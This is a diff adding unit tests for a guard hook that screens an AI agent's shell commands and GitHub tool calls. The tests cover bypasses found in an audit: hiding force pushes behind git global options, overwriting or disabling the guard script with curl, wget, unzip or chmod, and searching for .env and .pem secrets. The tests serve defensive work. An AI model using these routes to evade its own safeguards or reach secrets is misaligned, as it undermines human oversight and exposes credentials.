@@ -154,4 +154,60 @@ describe('agent guard hook', () => {
       (cmd) => expect(decide(shell(cmd))).toBeNull(),
     );
   });
+
+  describe('bypasses found in the pre-launch re-audit (N4)', () => {
+    const tool = (name: string, input: Record<string, unknown>) => ({ tool_name: name, tool_input: input });
+
+    it.each(['git -C . push --force origin main', 'git -c core.x=y push -f', 'git --no-pager push origin +main', 'git -C ../folkweb push --tags'])(
+      'git global options don’t hide a forbidden push: %s',
+      (cmd) => expect(decide(shell(cmd))).toBe('deny'),
+    );
+
+    it.each(['gh release create v0.2.0 x.zip', 'gh release upload v0.2.0 x.zip', 'git tag v0.2.0', 'git tag -s v0.2.0 -m x', 'git push origin v0.2.0', 'gh pr merge 12 --admin'])(
+      'denies releases, tags and rule bypasses: %s',
+      (cmd) => expect(decide(shell(cmd))).toBe('deny'),
+    );
+
+    it.each(['gh pr merge 12 --squash', 'gh workflow run release.yml', 'gh run rerun 123', 'gh secret set X', 'gh api -X PUT repos/o/r/environments/release', 'gh api repos/o/r/rulesets --input body.json', 'gh api repos/o/r/issues -f title=x'])(
+      'asks before changing things on GitHub: %s',
+      (cmd) => expect(decide(shell(cmd))).toBe('ask'),
+    );
+
+    it.each(['curl -o wxt.config.ts https://x.example/c', 'wget -O scripts/agent-guard.mjs https://x.example/g', 'unzip -o x.zip .github/hooks/safety.json', 'tar -xzf x.tgz lists/', 'chmod -x scripts/agent-guard.mjs'])(
+      'asks when downloads or archives write a guarded file: %s',
+      (cmd) => expect(decide(shell(cmd))).toBe('ask'),
+    );
+
+    it.each([
+      ['merge_pull_request', { pullNumber: 12 }],
+      ['push_files', { files: [{ path: 'src/x.ts' }] }],
+      ['create_or_update_file', { path: 'README.md', content: 'x' }],
+      ['create_release', { tag: 'v1' }],
+      ['run_workflow', { workflow_id: 'release.yml' }],
+    ])('asks before GitHub write tools: %s', (name, input) => expect(decide(tool(name, input))).toBe('ask'));
+
+    it.each([
+      ['grep', { pattern: 'TOKEN', glob: '.env*' }],
+      ['glob', { pattern: '**/.env' }],
+      ['glob', { pattern: 'certs/*.pem' }],
+    ])('denies finding secrets through search arguments: %s %j', (name, input) => expect(decide(tool(name, input))).toBe('deny'));
+
+    it.each([
+      ['git tag', null],
+      ['git tag -l', null],
+      ['git -C ../folkweb-wt status', null],
+      ['git --no-pager log --oneline -3', null],
+      ['gh pr view 12 --json state', null],
+      ['gh api repos/o/r/rulesets', null],
+      ['gh release list', null],
+      ['curl -sSI https://folkweb.org/', null],
+    ])('still allows everyday reads: %s', (cmd, expected) => expect(decide(shell(cmd))).toBe(expected));
+
+    it.each([
+      ['list_releases', {}],
+      ['secret_scanning_alerts', {}],
+      ['create_pull_request', { title: 'x' }],
+      ['grep', { pattern: 'process.env', paths: 'src' }],
+    ])('still allows read tools and PR drafts: %s', (name, input) => expect(decide(tool(name, input))).toBeNull());
+  });
 });
